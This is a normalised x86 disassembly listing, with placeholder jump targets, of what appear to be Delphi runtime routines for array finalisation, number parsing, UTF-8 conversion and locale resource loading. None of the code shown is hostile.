push [ ecx + edx + 0x6 ]
mov ecx [ ecx + edx + 0xa ]
mov ecx [ ecx ]
lea edx [ eax + esi ]
add eax ebx
call sub_404cec
pop eax
jmp r-xdata
cmp cl 0xe
je r-xdata
xor ecx ecx
mov cl [ edx + 0x1 ]
mov ecx [ ecx + edx + 0x2 ]
push ecx
mov ecx edx
lea edx [ eax + esi ]
add eax ebx
call sub_404bd0
pop eax
jmp r-xdata
cmp cl 0xf
je r-xdata
mov edx [ eax + esi ]
add eax ebx
call sub_405940
mov eax 0x4
jmp r-xdata
cmp cl 0x11
je r-xdata
mov ecx edx
mov edx [ eax + esi ]
add eax ebx
call sub_4052b8
mov eax 0x4
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_4028c8
sub_404cec
push ebx
push esi
push edi
push ebp
mov ebx eax
mov esi edx
mov edi ecx
mov ebp [ esp + 0x14 ]
mov cl [ edi ]
cmp cl 0xa
je r-xdata
mov eax ebx
mov edx [ esi ]
call sub_40408c
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xb
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_404754
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0xc
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn 0x4
jmp r-xdata
mov eax ebx
mov edx esi
call sub_404bb8
add ebx 0x10
add esi 0x10
dec ebp
jne r-xdata
cmp cl 0xd
je r-xdata
jmp r-xdata
xor ecx ecx
mov cl [ edi + 0x1 ]
lea edi [ ecx + edi + 0x2 ]
cmp cl 0xe
je r-xdata
mov eax ebx
mov edx esi
mov ecx [ edi + 0x8 ]
push [ edi + 0x4 ]
call sub_404cec
add ebx [ edi ]
add esi [ edi ]
dec ebp
jne r-xdata
jmp r-xdata
mov eax ebx
mov edx esi
mov ecx edi
call sub_404bd0
xor eax eax
mov al [ edi + 0x1 ]
add ebx [ eax + edi + 0x2 ]
add esi [ eax + edi + 0x2 ]
dec ebp
jne r-xdata
cmp cl 0xf
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
call sub_405940
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
cmp cl 0x11
je r-xdata
jmp r-xdata
mov eax ebx
mov edx [ esi ]
mov ecx edi
call sub_4052b8
add ebx 0x4
add esi 0x4
dec ebp
jne r-xdata
mov al 0x2
pop ebp
pop edi
pop esi
pop ebx
jmp sub_4028c8
sub_404e10
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov [ esp ] ebx
mov eax [ esp ]
call sub_404884
mov edx eax
mov ecx esi
mov eax ebx
call sub_404e04
pop edx
pop esi
pop ebx
retn
sub_404e34
push ebx
push ecx
mov ebx eax
xor eax eax
mov [ esp ] eax
mov eax ebx
call sub_4042f8
mov ecx eax
mov eax esp
mov edx ebx
call sub_404778
mov eax [ esp ]
pop edx
pop ebx
retn
sub_404e60
push edx
push eax
mov eax [ esp + 0x10 ]
mul [ esp ]
mov ecx eax
mov eax [ esp + 0x4 ]
mul [ esp + 0xc ]
add ecx eax
mov eax [ esp ]
mul [ esp + 0xc ]
add edx ecx
pop ecx
pop ecx
retn 0x8
sub_404e84
push ebx
push esi
push edi
push ebp
add esp 0xffffffec
mov [ esp ] edx
mov esi eax
mov ebp 0x1
xor edi edi
mov [ esp + 0x8 ] 0x0
mov [ esp + 0xc ] 0x0
test esi esi
jne r-xdata
cmp [ esi + ebp - 0x1 ] 0x20
je r-xdata
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
inc ebp
mov [ esp + 0x10 ] 0x0
mov al [ esi + ebp - 0x1 ]
cmp al 0x2d
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
add esp 0x14
pop ebp
pop edi
pop esi
pop ebx
retn
cmp al 0x2b
jne r-xdata
mov [ esp + 0x10 ] 0x1
inc ebp
jmp r-xdata
mov bl 0x1
cmp [ esi + ebp - 0x1 ] 0x24
je r-xdata
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov al [ esi + ebp - 0x1 ]
call sub_402af4
cmp al 0x58
je r-xdata
inc ebp
inc ebp
cmp [ esi + ebp - 0x1 ] 0x30
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
jmp r-xdata
add dl 0xf9
sub dl 0x6
jb r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jae r-xdata
mov al [ esi + ebp ]
call sub_402af4
cmp al 0x58
jne r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov edi eax
and edi 0xff
sub edi 0x37
jmp r-xdata
add dl 0xe6
sub dl 0x6
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
mov edi eax
and edi 0xff
sub edi 0x30
cmp [ esp + 0xc ] 0x0
jne r-xdata
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
mov edi eax
and edi 0xff
sub edi 0x57
jmp r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jl r-xdata
cmp [ esp + 0x8 ] 0x0
jb r-xdata
cmp [ esp + 0x10 ] 0x0
je r-xdata
cmp [ esp + 0xc ] 0xfffffff
jne r-xdata
jmp r-xdata
je r-xdata
cmp [ esp + 0x8 ] 0x0
cmp [ esp + 0xc ] 0xccccccc
jne r-xdata
jmp r-xdata
cmp [ esi + ebp - 0x1 ] 0x0
setne al
or bl al
je r-xdata
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
neg eax
adc edx 0x0
neg edx
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
jmp r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xffffffff
jbe r-xdata
cmp [ esp + 0xc ] 0x0
jne r-xdata
jg r-xdata
cmp [ esp + 0x8 ] 0xcccccccc
jbe r-xdata
mov eax [ esp ]
xor edx edx
mov [ eax ] edx
mov eax [ esp ]
mov [ eax ] ebp
jmp r-xdata
mov eax edi
cdq
push edx
push eax
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
shld edx eax 0x4
shl eax 0x4
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
setl al
cmp [ esp + 0x8 ] 0x0
setb al
jmp r-xdata
push 0x0
push 0xa
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
call sub_404e60
push edx
push eax
mov eax edi
cdq
add eax [ esp ]
adc edx [ esp + 0x4 ]
add esp 0x8
mov [ esp + 0x8 ] eax
mov [ esp + 0xc ] edx
inc ebp
xor ebx ebx
jmp r-xdata
jmp r-xdata
mov al [ esi + ebp - 0x1 ]
mov edx eax
add dl 0xd0
sub dl 0xa
jb r-xdata
dec ebp
cmp al [ esp + 0x10 ]
je r-xdata
sub_4050e4
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x4 ]
mov ebx [ ebx ]
mov eax [ ebp + 0x8 ]
mov edi [ eax ]
test edi edi
jg r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
test ebx ebx
je r-xdata
test edi edi
jge r-xdata
xor eax eax
mov al [ esi + 0x1 ]
add esi eax
mov eax esi
mov edx [ eax + 0x2 ]
mov [ ebp - 0x18 ] edx
mov edx [ eax + 0x6 ]
test edx edx
je r-xdata
sub ebx 0x4
mov eax [ ebx ]
mov [ ebp - 0x10 ] eax
sub ebx 0x4
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_4050dc
jmp r-xdata
mov al 0x4
call sub_4028c8
xor esi esi
mov esi [ edx ]
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
add [ ebp - 0x1c ] 0x8
test ebx ebx
je r-xdata
mov al 0x4
call sub_4028c8
mov eax edi
imul [ ebp - 0x18 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0x1c ]
cdq
idiv edi
cmp eax [ ebp - 0x18 ]
je r-xdata
mov [ ebp - 0x20 ] ebx
cmp edi [ ebp - 0x10 ]
jge r-xdata
cmp [ ebx ] 0x1
jne r-xdata
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x1c ]
call sub_4027ac
mov ebx [ ebp - 0x20 ]
jmp r-xdata
test esi esi
je r-xdata
dec [ ebx ]
mov eax [ ebp - 0x1c ]
call sub_40276c
mov ebx eax
mov eax [ ebp - 0x10 ]
mov [ ebp - 0x14 ] eax
cmp edi [ ebp - 0x14 ]
jge r-xdata
mov [ ebx ] 0x1
add ebx 0x4
mov [ ebx ] edi
add ebx 0x4
mov edx edi
sub edx [ ebp - 0x10 ]
imul edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
imul eax [ ebp - 0x10 ]
add eax ebx
xor ecx ecx
call sub_402cfc
cmp [ ebp - 0x8 ] 0x1
jle r-xdata
mov eax ebx
add eax 0x8
mov edx edi
imul edx [ ebp - 0x18 ]
add eax edx
mov ecx [ ebp - 0x10 ]
sub ecx edi
mov edx esi
call j_sub_404ac0
test esi esi
je r-xdata
mov [ ebp - 0x14 ] edi
mov eax [ ebp - 0x4 ]
mov [ eax ] ebx
add [ ebp + 0x8 ] 0x4
dec [ ebp - 0x8 ]
dec edi
test edi edi
jl r-xdata
mov ecx [ ebp - 0x14 ]
imul ecx [ ebp - 0x18 ]
mov edx ebx
add edx 0x8
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_402968
mov edx [ ebp - 0x14 ]
imul edx [ ebp - 0x18 ]
mov eax ebx
add eax 0x8
xor ecx ecx
call sub_402cfc
mov eax [ ebp - 0x14 ]
push eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax ebx
add eax 0x8
mov ecx esi
call sub_4050c4
jmp r-xdata
inc edi
mov [ ebp - 0xc ] 0x0
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0xc ]
lea eax [ ebx + eax * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx esi
call sub_4050e4
inc [ ebp - 0xc ]
dec edi
jne r-xdata
sub_40527c
mov ecx [ eax ]
test ecx ecx
je r-xdata
retn
mov [ eax ] 0x0
[ ecx - 0x8 ]
jne r-xdata
push eax
mov eax ecx
xor ecx ecx
mov cl [ edx + 0x1 ]
mov edx [ ecx + edx + 0x6 ]
test edx edx
je r-xdata
sub eax 0x8
call sub_40278c
pop eax
mov ecx [ eax - 0x4 ]
test ecx ecx
je r-xdata
mov edx [ edx ]
call sub_404ac0
sub_4052b8
push ebx
mov ebx [ eax ]
test edx edx
je r-xdata
test ebx ebx
je r-xdata
[ edx - 0x8 ]
mov [ eax ] edx
pop ebx
retn
[ ebx - 0x8 ]
jne r-xdata
push eax
push edx
mov edx ecx
inc [ ebx - 0x8 ]
call sub_40527c
pop edx
pop eax
sub_4052e0
add esp 0xffffffe4
push 0x1c
lea edx [ esp + 0x4 ]
push edx
push eax
call sub_40137c
cmp [ esp + 0x10 ] 0x1000
jne r-xdata
xor eax eax
mov eax [ esp + 0x4 ]
jmp r-xdata
add esp 0x1c
retn
sub_405310
push ebx
push esi
add esp 0xfffffef8
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov eax [ ebx + 0x10 ]
add esp 0x108
pop esi
pop ebx
retn
push 0x105
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40130c
mov eax esp
mov dl 0x1
call sub_40554c
mov esi eax
mov [ ebx + 0x10 ] esi
test esi esi
jne r-xdata
mov eax [ ebx + 0x4 ]
mov [ ebx + 0x10 ] eax
sub_405358
mov edx [ rw-data ]
test edx edx
je r-xdata
retn
cmp eax [ edx + 0x4 ]
je r-xdata
mov eax edx
call sub_405310
retn
cmp eax [ edx + 0x8 ]
je r-xdata
cmp eax [ edx + 0xc ]
jne r-xdata
mov edx [ edx ]
test edx edx
jne r-xdata
sub_405394
push ebp
mov ebp esp
add esp 0xfffffdb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push r-xdata
call sub_401314
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0x5c
jne r-xdata
push r-xdata
push esi
call sub_40131c
mov ebx eax
test ebx ebx
je r-xdata
mov esi [ ebp - 0x4 ]
add esi 0x2
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1 ] 0x5c
jne r-xdata
push 0x105
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call ebx
test eax eax
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
add eax 0x2
call sub_405380
mov esi eax
cmp [ esi ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
jmp r-xdata
lea eax [ esi + 0x1 ]
call sub_405380
mov edi eax
mov eax edi
sub eax esi
mov edx eax
add edx ebx
inc edx
cmp edx 0x105
jg r-xdata
mov eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
mov eax [ ebp - 0x4 ]
push eax
call lstrcpynA
lea eax [ esi + 0x1 ]
call sub_405380
mov esi eax
cmp [ esi ] 0x0
je r-xdata
inc eax
push eax
push esi
lea eax [ ebp - 0x24f ]
add eax ebx
push eax
call lstrcpynA
lea eax [ ebp - 0x14a ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call FindFirstFileA
mov esi eax
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push esi
call FindClose
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
lea edx [ ebx + 0x1 ]
add eax edx
inc eax
cmp eax 0x105
jg r-xdata
mov ebx esi
sub ebx [ ebp - 0x4 ]
lea eax [ ebx + 0x1 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x24f ]
push eax
call lstrcpynA
jmp r-xdata
mov [ ebp + ebx - 0x24f ] 0x5c
mov eax 0x105
sub eax ebx
dec eax
push eax
lea eax [ ebp - 0x11e ]
push eax
lea eax [ ebp - 0x24f ]
add eax ebx
inc eax
push eax
call lstrcpynA
lea eax [ ebp - 0x11e ]
push eax
call lstrlenA
inc eax
add ebx eax
mov esi edi
sub_40554c
push ebp
mov ebp esp
add esp 0xfffffee0
push ebx
push esi
mov [ ebp - 0x4 ] eax
push 0x105
lea eax [ ebp - 0x11d ]
push eax
push 0x0
call sub_40130c
mov [ ebp - 0x12 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401364
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_405651
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x18 ] 0x5
lea eax [ ebp - 0x11d ]
mov edx 0x105
call sub_405394
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
lea eax [ ebp - 0x11d ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_40136c
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000002
call sub_401364
test eax eax
je r-xdata
mov [ ebp - 0xe ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_40135c
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x12 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
call sub_40136c
test eax eax
je r-xdata
lea eax [ ebp - 0x8 ]
push eax
push 0xf0019
push 0x0
push r-xdata
push 0x80000001
call sub_401364
test eax eax
jne r-xdata
mov [ ebp - 0x12 ] 0x0
push 0x105
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x11d ]
push eax
call lstrcpynA
push 0x5
lea eax [ ebp - 0xd ]
push eax
push 0x3
call sub_40132c
push eax
call sub_401304
xor esi esi
cmp [ ebp - 0x11d ] 0x0
je r-xdata
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebp - 0xd ] 0x0
jne r-xdata
lea eax [ ebp - 0x11d ]
push eax
call lstrlenA
mov ebx eax
lea eax [ ebp - 0x11d ]
add ebx eax
jmp r-xdata
cmp [ ebp - 0x12 ] 0x0
je r-xdata
cmp [ ebx ] 0x2e
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
je r-xdata
lea eax [ ebp - 0x11d ]
cmp ebx eax
jne r-xdata
inc ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
dec ebx
test esi esi
jne r-xdata
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0x12 ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
cmp [ ebp - 0xd ] 0x0
je r-xdata
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
test esi esi
jne r-xdata
mov [ ebp - 0xb ] 0x0
lea eax [ ebp - 0x11d ]
mov edx ebx
sub edx eax
mov eax 0x105
sub eax edx
push eax
lea eax [ ebp - 0xd ]
push eax
push ebx
call lstrcpynA
push 0x2
push 0x0
lea eax [ ebp - 0x11d ]
push eax
call LoadLibraryExA
mov esi eax
sub_4057ec
push ebx
push esi
mov esi [ rw-data ]
test esi esi
je r-xdata
mov edx esi
test edx edx
je r-xdata
mov edx [ esi + 0x4 ]
cmp edx eax
jne r-xdata
pop esi
pop ebx
retn
mov ecx [ edx ]
test ecx ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ rw-data ] eax
mov edx 0x8
mov eax esi
call sub_40278c
pop esi
pop ebx
retn
mov edx [ edx ]
test edx edx
jne r-xdata
mov ebx [ ecx + 0x4 ]
cmp ebx eax
jne r-xdata
mov esi ecx
mov eax [ ecx ]
mov [ edx ] eax
mov edx 0x8
mov eax esi
call sub_40278c
jmp r-xdata
sub_40584c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_405887
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
sub_4058b8
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
xor edx edx
push ebp
push sub_40591c
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
call sub_40584c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405923
mov eax [ ebp - 0x4 ]
cmp eax [ rw-data ]
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ rw-data ] eax
jmp r-xdata
retn
mov edx [ eax ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
mov eax [ eax ]
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov [ eax ] edx
jmp r-xdata
sub_405940
test edx edx
je r-xdata
mov ecx [ eax ]
test ecx ecx
mov [ eax ] edx
je r-xdata
push edx
push eax
mov eax [ edx ]
push edx
call [ eax + 0x4 ]
pop eax
mov ecx [ eax ]
pop [ eax ]
test ecx ecx
jne r-xdata
retn
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
mov eax [ ecx ]
push ecx
call [ eax + 0x8 ]
retn
retn
sub_40596c
test edx edx
je sub_405928
push edi
mov edi eax
push 0x0
push esp
push ecx
push edx
mov eax [ edx ]
call [ eax ]
test eax eax
je r-xdata
mov eax [ edi ]
test eax eax
je r-xdata
mov al 0x17
jmp sub_4028c8
pop eax
mov [ edi ] eax
pop edi
retn
push eax
mov eax [ eax ]
call [ eax + 0x8 ]
sub_4059d4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_40339c
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_405a10
push ebp
mov ebp esp
push ebx
push esi
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x4 ]
push eax
call InterlockedDecrement
mov esi eax
test esi esi
jne r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x4 ]
sub_405a38
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
xor edx edx
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax edx
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
xor esi esi
xor ecx ecx
test eax eax
je r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
lea edx [ esi + 0x1 ]
mov eax [ ebp - 0x8 ]
movzx edx [ eax + ecx * 2 ]
inc ecx
cmp edx 0x7f
jbe r-xdata
cmp ecx [ ebp + 0x8 ]
jae r-xdata
inc esi
cmp ecx [ ebp + 0x8 ]
jb r-xdata
cmp edx 0x7ff
jbe r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
cmp esi [ ebp - 0x4 ]
jb r-xdata
inc esi
inc esi
mov [ eax + esi ] 0x0
jmp r-xdata
mov esi [ ebp - 0x4 ]
dec esi
mov edx [ ebp - 0x8 ]
movzx edx [ edx + ecx * 2 ]
inc ecx
cmp edx 0x7f
ja r-xdata
cmp edx 0x7ff
jbe r-xdata
mov [ eax + esi ] dl
inc esi
jmp r-xdata
lea ebx [ esi + 0x2 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
lea ebx [ esi + 0x3 ]
cmp ebx [ ebp - 0x4 ]
ja r-xdata
mov ebx edx
shr ebx 0x6
or bl 0xc0
mov [ eax + esi ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x1 ] dl
add esi 0x2
mov ebx edx
shr ebx 0xc
or bl 0xe0
mov [ eax + esi ] bl
mov ebx edx
shr ebx 0x6
and bl 0x3f
or bl 0x80
mov [ eax + esi + 0x1 ] bl
and dl 0x3f
or dl 0x80
mov [ eax + esi + 0x2 ] dl
add esi 0x3
jmp r-xdata
sub_405b14
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0xc ] 0x0
jne r-xdata
mov [ ebp - 0x10 ] 0xffffffff
xor eax eax
xor esi esi
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
mov [ ebp - 0x10 ] eax
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
jmp r-xdata
mov eax [ ebp - 0x10 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
inc eax
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
test dl 0x80
je r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
cmp esi [ ebp + 0x8 ]
jb r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp eax [ ebp - 0x8 ]
jb r-xdata
and dl 0x3f
test dl 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov edx [ ebp - 0xc ]
xor ecx ecx
mov cl [ edx + esi ]
inc esi
test cl 0x80
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
and dl 0xc0
cmp dl 0x80
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx + eax * 2 ] cx
cmp esi [ ebp + 0x8 ]
jae r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
and ecx 0x3f
test cl 0x20
je r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + esi ]
inc esi
mov ebx edx
and bl 0xc0
cmp bl 0x80
jne r-xdata
and dl 0x3f
and edx 0xff
shl ecx 0x6
or dx cx
mov ecx [ ebp - 0x4 ]
mov [ ecx + eax * 2 ] dx
jmp r-xdata
cmp esi [ ebp + 0x8 ]
jae r-xdata
inc eax
and dl 0x3f
and edx 0xff
shl ecx 0x6
or edx ecx
mov ecx edx
sub_405c4c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405ceb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404038
mov eax ebx
xor edx edx
call sub_404890
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405cf2
lea eax [ ebp - 0x4 ]
call sub_404038
retn
mov eax ebx
call sub_404884
lea edx [ eax + eax * 2 ]
lea eax [ ebp - 0x4 ]
call sub_404684
mov eax ebx
call sub_404884
push eax
mov eax [ ebp - 0x4 ]
call sub_4042f8
inc eax
push eax
mov eax ebx
call sub_404874
push eax
mov eax [ ebp - 0x4 ]
call sub_4044f8
pop ecx
pop edx
call sub_405a38
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404038
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404684
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_40408c
sub_405cf8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405d8f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_404718
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405d96
lea eax [ ebp - 0x4 ]
call sub_404718
retn
mov eax ebx
call sub_4042f8
mov edx eax
lea eax [ ebp - 0x4 ]
call sub_404960
mov eax ebx
call sub_4042f8
push eax
mov eax [ ebp - 0x4 ]
call sub_404884
inc eax
push eax
mov eax ebx
call sub_4044f8
push eax
mov eax [ ebp - 0x4 ]
call sub_404874
pop ecx
pop edx
call sub_405b14
test eax eax
jle r-xdata
lea eax [ ebp - 0x4 ]
call sub_404718
mov edx eax
dec edx
lea eax [ ebp - 0x4 ]
call sub_404960
jmp r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404754
sub_405d9c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_405ddf
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404864
mov eax [ ebp - 0x4 ]
mov edx esi
call sub_405c4c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_405de6
lea eax [ ebp - 0x4 ]
call sub_404718
retn
sub_405dec
push ebx
push esi
add esp 0xfffffc00
mov esi edx
mov ebx eax
test ebx ebx
je r-xdata
add esp 0x400
pop esi
pop ebx
retn
cmp [ ebx + 0x4 ] 0x10000
jge r-xdata
mov eax esi
mov edx [ ebx + 0x4 ]
call sub_404230
push 0x400
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_405358
push eax
call sub_40133c
mov ecx eax
mov edx esp
mov eax esi
call sub_404128
jmp r-xdata
sub_405e44
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
xor edx edx
push ebp
push sub_405eaa
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0xb ]
push edx
push 0x1004
push eax
call sub_401304
lea eax [ ebp - 0x10 ]
lea edx [ ebp - 0xb ]
mov ecx 0x7
call sub_4042a8
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x4 ]
call sub_402d1c
mov ebx eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
